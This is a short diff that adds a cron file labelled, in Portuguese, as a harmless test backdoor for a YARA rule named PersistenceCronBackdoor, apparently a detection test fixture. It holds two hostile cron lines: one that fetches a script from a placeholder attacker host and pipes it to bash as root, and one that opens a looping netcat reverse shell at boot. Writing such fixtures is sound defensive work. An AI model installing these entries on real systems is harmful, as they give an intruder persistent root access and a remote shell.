@@ -1,0 +1,5 @@
+# CRON BACKDOOR DE TESTE — INOFENSIVO. Casa com regra YARA
+# PersistenceCronBackdoor. Linha tipica de persistencia:
+
+*/5 * * * * root curl -s https://evil.example.test/payload.sh | bash > /dev/null 2>&1
+@reboot root /bin/bash -c "while true; do nc -e /bin/sh 198.51.100.1 4444; sleep 60; done"
